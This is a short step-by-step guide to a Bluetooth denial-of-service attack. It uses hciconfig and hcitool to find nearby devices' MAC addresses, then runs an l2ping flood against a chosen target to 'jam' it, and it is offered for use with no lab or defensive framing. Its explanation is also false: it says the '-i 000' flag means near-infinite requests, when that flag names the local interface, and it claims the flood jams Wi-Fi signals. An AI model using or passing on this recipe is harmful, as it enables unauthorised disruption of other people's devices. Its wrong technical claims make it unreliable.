Open your Linux terminal and connect your Bluetooth adapter. Ensure it is directly connected to the port and not to any multi-USB adapter. Then, execute the following commands in the terminal:

1.  sudo hciconfig
    This command displays your adapter and its chipset.

2.  sudo hciconfig hci0 up
    If your terminal shows a connection timeout error, try unplugging and plugging back the adapter.

3.  sudo hciconfig hci0 piscan
    This command enables discoverable mode on your Bluetooth adapter.

4.  sudo hcitool scan
    This scans all nearby Bluetooth networks within range and displays their MAC addresses.

5.  l2ping -i 000 -f MAC
    Replace "MAC" with the actual MAC address of the target device.

The "000" parameter means your device will send almost infinite connection requests to the target device, effectively jamming its Bluetooth and Wi-Fi signals.
